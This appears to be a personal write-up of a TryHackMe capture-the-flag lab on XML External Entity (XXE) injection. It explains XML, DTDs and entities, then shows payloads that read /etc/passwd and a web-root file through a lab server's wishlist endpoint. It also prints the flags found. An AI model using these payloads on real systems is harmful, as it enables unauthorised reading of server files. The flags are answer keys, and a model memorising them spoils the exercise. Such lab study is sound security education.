# Task 11 - XXE - Day 5: SOC-mas XX-what-ee?

#xxe #xml 

## Learning Objectives

- Understand the basic concepts related to XML
- Explore XML External Entity (XXE) and its components
- Learn how to exploit the vulnerability
- Understand remediation measures
## Important Concepts

**Extensible Markup Language (XML)**

XML is a commonly used method to transport and store data in a structured format that humans and machines can easily understand. Consider a scenario where two computers need to communicate and share data. Both devices need to agree on a common format for exchanging information. This agreement (format) is known as `XML`. You can think of XML as a digital filing cabinet. Just as a filing cabinet has folders with labelled documents inside, XML uses `tags` to label and organise information. These tags are like folders that define the type of data stored. This is what an XML looks like, a simple piece of text information organised in a structured manner: 

```javascript
<people>
   <name>Glitch</name>
   <address>Wareville</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>
```

In this case, the tags  `people`, `name`, `address`, etc are like folders in a filing cabinet, but now they store data about Glitch. The content inside the tags, like "Glitch," "Wareville," and "123-4567" represents the actual data being stored. Like before, the key benefit of XML is that it is easily shareable and customisable, allowing you to create your own tags.


**Document Type Definition (DTD)**

Now that the two computers have agreed to share data in a common format, what about the structure of the format? Here is when the DTD comes into play. A DTD is a set of **rules** that defines the structure of an XML document. Just like a database scheme, it acts like a blueprint, telling you what elements (tags) and attributes are allowed in the XML file. Think of it as a guideline that ensures the XML document follows a specific structure.

For example, if we want to ensure that an XML document about `people` will always include a `name`, `address`, `email`, and `phone number`, we would define those rules through a DTD as shown below:  

```javascript
<!DOCTYPE people [
   <!ELEMENT people(name, address, email, phone)>
   <!ELEMENT name (#PCDATA)>
   <!ELEMENT address (#PCDATA)>
   <!ELEMENT email (#PCDATA)>
   <!ELEMENT phone (#PCDATA)>
]>
```

In the above DTD, **<!ELEMENT>**  defines the elements (tags) that are allowed, like name, address, email, and phone, whereas `#PCDATA` stands for parsed `people` data, meaning it will consist of just plain text.

**Entities**

So far, both computers have agreed on the format, the structure of data, and the type of data they will share. Entities in XML are placeholders that allow the insertion of large chunks of data or referencing internal or external files. They assist in making the XML file easy to manage, especially when the same data is repeated multiple times. Entities can be defined internally within the XML document or externally, referencing data from an outside source. 

For example, an external entity references data from an external file or resource. In the following code, the entity `&ext;` could refer to an external file located at "`http://tryhackme.com/robots.txt`", which would be loaded into the XML, if allowed by the system:

```javascript
<!DOCTYPE people [
   <!ENTITY ext SYSTEM "http://tryhackme.com/robots.txt">
]>
<people>
   <name>Glitch</name>
   <address>&ext;</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>
```

We are specifically discussing external entities because it is one of the main reasons that XXE is introduced if it is not properly managed.

**XML External Entity (XXE)**

After understanding XML and how entities work, we can now explore the XXE vulnerability. XXE is an attack that takes advantage of **how** **XML parsers handle external entities**. When a web application processes an XML file that contains an external entity, the parser attempts to load or execute whatever resource the entity points to. If necessary sanitisation is not in place, the attacker may point the entity to any malicious source/code causing the undesired behaviour of the web app.

For example, if a vulnerable XML parser processes this external entity definition:

```javascript
<!DOCTYPE people[
   <!ENTITY thmFile SYSTEM "file:///etc/passwd">
]>
<people>
   <name>Glitch</name>
   <address>&thmFile;</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>
```

Here, the entity `&thmFile;` refers to the sensitive file `/etc/passwd` on a system. When the XML is processed, the parser will try to load and display the contents of that file, exposing sensitive information to the attacker.  

In the upcoming tasks, we will examine how XXE works and how to exploit it.



## Answer the questions below

### What is the flag discovered after navigating through the wishes?
```
POST /wishlist.php HTTP/1.1
Host: 10.10.24.156
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/xml
Content-Length: 220
Origin: http://10.10.24.156
Connection: keep-alive
Referer: http://10.10.24.156/product.php?id=1
Priority: u=0


<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_15.txt"> ]>
<wishlist>
	<user_id>1</user_id>
	<item>
	       <product_id>&payload;</product_id>
	</item>
</wishlist>


HTTP/1.1 200 OK
Date: Thu, 05 Dec 2024 18:51:33 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 224
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

The product ID: Wish #15
Name: Mayor Malware
Address: Test
---------------------------------------
Product: Waredy Cane
Quantity: 1
---------------------------------------
PS: The flag is THM{Brut3f0rc1n6_mY_w4y}
is invalid.
```

 THM{Brut3f0rc1n6_mY_w4y}

### What is the flag seen on the possible proof of sabotage?

```
http://10.10.24.156/CHANGELOG

commit 3f786850e387550fdab836ed7e6dc881de23001b (HEAD -> master, origin/master, origin/HEAD)
Author: Mayor Malware - Wareville <mayor@wareville.org>
Date:   Wed Dec 4 21:24:22 2024 +0200

    Fixed the wishlist.php page THM{m4y0r_m4lw4r3_b4ckd00rs}

commit 89e6c98d92887913cadf06b2adb97f26cde4849b (tag: v1.0.0)
Author: Software - Wareville <software@wareville.org>
Date:   Thu Dec 4 14:45:18 2024 +0200

    Almost done with the wishlists page, needs to handle XML parsing

commit 2b66fd261ee5c6cfc8de7fa466bab600bcfe4f69
Author: Software - Wareville <software@wareville.org>
Date:   Tue Dec 2 15:20:57 2024 +0200

    Finally done with the landing page and initial CSS

commit e983f374794de9c64e3d1c1de1d490c0756eeeff
Author: Software - Wareville <software@wareville.org>
Date:   Tue Dec 2 15:19:33 2024 +0200

    Initial commit

```